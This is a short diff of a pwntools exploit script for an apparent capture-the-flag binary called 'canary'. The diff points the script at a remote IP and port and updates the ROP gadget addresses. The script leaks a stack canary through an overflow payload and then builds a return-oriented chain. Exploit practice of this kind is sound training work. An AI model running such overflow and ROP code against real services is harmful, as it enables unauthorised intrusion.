@@ -4,7 +4,8 @@ context.arch = "amd64"
 context.log_level = "debug"
 
 elf = ELF("../attachments/canary")
-io = process("../attachments/canary")
+# io = process("../attachments/canary")
+io = remote("121.40.70.24", 33747)
 
 payload = cyclic(0x50 - 0x8 + 1)
 io.sendafter(b"Enter your message (type 'exit' to quit): ", payload)
@@ -13,8 +14,8 @@ io.recvuntil(payload)
 canary = b"\x00" + io.recv(7)
 success(f"canary => {canary.hex()}")
 
-pop_rdi_ret = 0x0000000000401383
-pop_rsi_r15_ret = 0x0000000000401381
+pop_rdi_ret = 0x0000000000401433
+pop_rsi_r15_ret = 0x0000000000401431
 ret = 0x000000000040101A
 
 payload = flat(
